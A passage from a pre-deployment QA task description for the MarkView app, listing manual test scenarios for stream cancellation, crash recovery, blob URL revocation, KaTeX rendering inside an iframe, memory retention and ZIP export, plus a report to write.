streaming — verify all parallel section tasks observe cancellation, cache cleanup waits for in-flight writes to complete or be discarded, no leftover .tmp files; (j) **crash-recovery**: kill MarkView via `pkill -9 MarkView` mid Phase 2 → relaunch → verify next session uses fresh sessionUUID, stale .insight-cache directory ignored (not read or reused); (k) **blob URL revocation Web Inspector check**: open Web Inspector → Resources → Blobs panel; navigate between nodes with different lib subsets; verify obsolete blob URLs are revoked (count decreases); (l) **KaTeX math content**: include a section with LaTeX math (e.g. `$$E = mc^2$$`) in skeleton metadata → verify KaTeX renders correctly inside iframe (webfonts via base64-inline or relative path). Each scenario: force GC, verify zero retained `InsightSession`/`InsightNode`/`InsightCache`. Verify exported ZIP opens in Safari with full breadcrumb navigation. Verify all user-spec acceptance criteria via manual flow on `TestFiles/`. Verify `tasks/todo.md` updated with v2 paths (Decision 9 + T8). Write report `logs/qa/pre-deploy-qa-report.md`.
- **Skill:** pre-deploy-qa
- **Reviewers:** none
